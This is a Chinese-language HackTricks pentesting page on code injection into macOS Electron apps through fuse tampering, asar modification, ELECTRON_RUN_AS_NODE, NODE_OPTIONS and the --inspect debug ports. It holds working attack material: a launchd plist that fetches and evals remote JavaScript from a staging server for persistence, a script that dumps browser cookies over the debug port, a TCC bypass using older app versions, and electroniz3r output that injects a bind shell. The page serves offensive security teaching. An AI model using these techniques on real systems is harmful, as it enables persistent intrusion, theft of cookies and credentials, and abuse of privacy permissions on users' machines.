# macOS Electron 应用程序注入

{{#include ../../../banners/hacktricks-training.md}}

## 基本信息

如果你不知道 Electron 是什么，你可以在 [**这里找到很多信息**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation)。但现在只需知道 Electron 运行 **node**。\
而 node 有一些 **参数** 和 **环境变量** 可以用来 **执行其他代码**，而不是指定的文件。

### Electron 保险丝

这些技术将在接下来讨论，但最近 Electron 添加了几个 **安全标志以防止它们**。这些是 [**Electron 保险丝**](https://www.electronjs.org/docs/latest/tutorial/fuses)，用于 **防止** macOS 中的 Electron 应用程序 **加载任意代码**：

- **`RunAsNode`**：如果禁用，它会阻止使用环境变量 **`ELECTRON_RUN_AS_NODE`** 来注入代码。
- **`EnableNodeCliInspectArguments`**：如果禁用，参数如 `--inspect`、`--inspect-brk` 将不被尊重。避免通过这种方式注入代码。
- **`EnableEmbeddedAsarIntegrityValidation`**：如果启用，加载的 **`asar`** **文件** 将由 macOS **验证**。以此方式 **防止** 通过修改该文件的内容进行 **代码注入**。
- **`OnlyLoadAppFromAsar`**：如果启用，它将只检查并使用 app.asar，而不是按以下顺序加载：**`app.asar`**、**`app`**，最后是 **`default_app.asar`**。因此确保当与 **`embeddedAsarIntegrityValidation`** 保险丝 **结合** 使用时，**不可能** **加载未验证的代码**。
- **`LoadBrowserProcessSpecificV8Snapshot`**：如果启用，浏览器进程使用名为 `browser_v8_context_snapshot.bin` 的文件作为其 V8 快照。

另一个有趣的保险丝不会阻止代码注入的是：

- **EnableCookieEncryption**：如果启用，磁盘上的 cookie 存储将使用操作系统级别的加密密钥进行加密。

### 检查 Electron 保险丝

你可以通过以下方式 **检查这些标志**：
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### 修改 Electron Fuses

正如 [**文档提到的**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode)，**Electron Fuses** 的配置是在 **Electron binary** 内部配置的，其中包含字符串 **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**。

在 macOS 应用程序中，这通常位于 `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
您可以在 [https://hexed.it/](https://hexed.it/) 中加载此文件并搜索前面的字符串。在此字符串后，您可以在 ASCII 中看到数字 "0" 或 "1"，指示每个保险丝是禁用还是启用。只需修改十六进制代码（`0x30` 是 `0`，`0x31` 是 `1`）以 **修改保险丝值**。

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

请注意，如果您尝试 **覆盖** 应用程序中已修改字节的 **`Electron Framework`** 二进制文件，则该应用程序将无法运行。

## RCE 向 Electron 应用程序添加代码

可能有 **外部 JS/HTML 文件** 被 Electron 应用程序使用，因此攻击者可以在这些文件中注入代码，这些文件的签名不会被检查，并在应用程序的上下文中执行任意代码。

> [!CAUTION]
> 但是，目前有两个限制：
>
> - 修改应用程序需要 **`kTCCServiceSystemPolicyAppBundles`** 权限，因此默认情况下这不再可能。
> - 编译后的 **`asap`** 文件通常具有 **`embeddedAsarIntegrityValidation`** `和` **`onlyLoadAppFromAsar`** `启用`
>
> 使得此攻击路径更加复杂（或不可能）。

请注意，可以通过将应用程序复制到另一个目录（如 **`/tmp`**），将文件夹 **`app.app/Contents`** 重命名为 **`app.app/NotCon`**，**修改** **asar** 文件以包含您的 **恶意** 代码，然后将其重命名回 **`app.app/Contents`** 并执行它，从而绕过 **`kTCCServiceSystemPolicyAppBundles`** 的要求。

您可以使用以下命令从 asar 文件中解压代码：
```bash
npx asar extract app.asar app-decomp
```
将其打包回去，修改为：
```bash
npx asar pack app-decomp app-new.asar
```
## RCE with `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

根据[**文档**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)，如果设置了这个环境变量，它将以普通的 Node.js 进程启动该进程。
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> 如果熔断器 **`RunAsNode`** 被禁用，环境变量 **`ELECTRON_RUN_AS_NODE`** 将被忽略，这将无法工作。

### 从应用程序 Plist 注入

正如 [**这里提到的**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/)，您可以在 plist 中滥用这个环境变量以保持持久性：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE with `NODE_OPTIONS`

您可以将有效负载存储在不同的文件中并执行它：
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> 如果熔断器 **`EnableNodeOptionsEnvironmentVariable`** 被 **禁用**，则应用在启动时将 **忽略** 环境变量 **NODE_OPTIONS**，除非环境变量 **`ELECTRON_RUN_AS_NODE`** 被设置，如果熔断器 **`RunAsNode`** 被禁用，该变量也将被 **忽略**。
>
> 如果您不设置 **`ELECTRON_RUN_AS_NODE`**，您将会发现 **错误**：`Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### 从 App Plist 注入

您可以在 plist 中滥用此环境变量以保持持久性，添加以下键：
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE with inspecting

根据[**this**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)，如果你使用 **`--inspect`**、**`--inspect-brk`** 和 **`--remote-debugging-port`** 等标志执行 Electron 应用程序，将会 **打开一个调试端口**，这样你就可以连接到它（例如从 Chrome 的 `chrome://inspect`），并且你将能够 **在其上注入代码**，甚至启动新进程。\
例如：
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> 如果熔断器 **`EnableNodeCliInspectArguments`** 被禁用，应用程序将 **忽略节点参数**（如 `--inspect`），除非环境变量 **`ELECTRON_RUN_AS_NODE`** 被设置，如果熔断器 **`RunAsNode`** 被禁用，该变量也将被 **忽略**。
>
> 然而，您仍然可以使用 **electron 参数 `--remote-debugging-port=9229`**，但之前的有效载荷将无法执行其他进程。

使用参数 **`--remote-debugging-port=9222`** 可以从 Electron 应用程序中窃取一些信息，如 **历史记录**（使用 GET 命令）或浏览器的 **cookies**（因为它们在浏览器内部是 **解密** 的，并且有一个 **json 端点** 可以提供它们）。

您可以在 [**这里**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) 和 [**这里**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) 学习如何做到这一点，并使用自动工具 [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) 或简单的脚本，如：
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
在[**这篇博客**](https://hackerone.com/reports/1274695)中，这种调试被滥用以使无头 Chrome **在任意位置下载任意文件**。

### 从应用程序 Plist 注入

您可以在 plist 中滥用此环境变量，通过添加这些键来保持持久性：
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass abusing Older Versions

> [!TIP]
> macOS 的 TCC 守护进程不会检查应用程序的执行版本。因此，如果您 **无法在 Electron 应用程序中注入代码**，可以下载该应用的旧版本并在其上注入代码，因为它仍然会获得 TCC 权限（除非信任缓存阻止它）。

## Run non JS Code

之前的技术将允许您在 **Electron 应用程序的进程中运行 JS 代码**。但是，请记住，**子进程在与父应用程序相同的沙箱配置文件下运行**，并且 **继承它们的 TCC 权限**。\
因此，如果您想利用权限访问相机或麦克风，例如，您可以直接 **从进程中运行另一个二进制文件**。

## Automatic Injection

工具 [**electroniz3r**](https://github.com/r3ggi/electroniz3r) 可以轻松用于 **查找已安装的易受攻击的 Electron 应用程序** 并在其上注入代码。该工具将尝试使用 **`--inspect`** 技术：

您需要自己编译它，可以这样使用：
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## 参考

- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{{#include ../../../banners/hacktricks-training.md}}
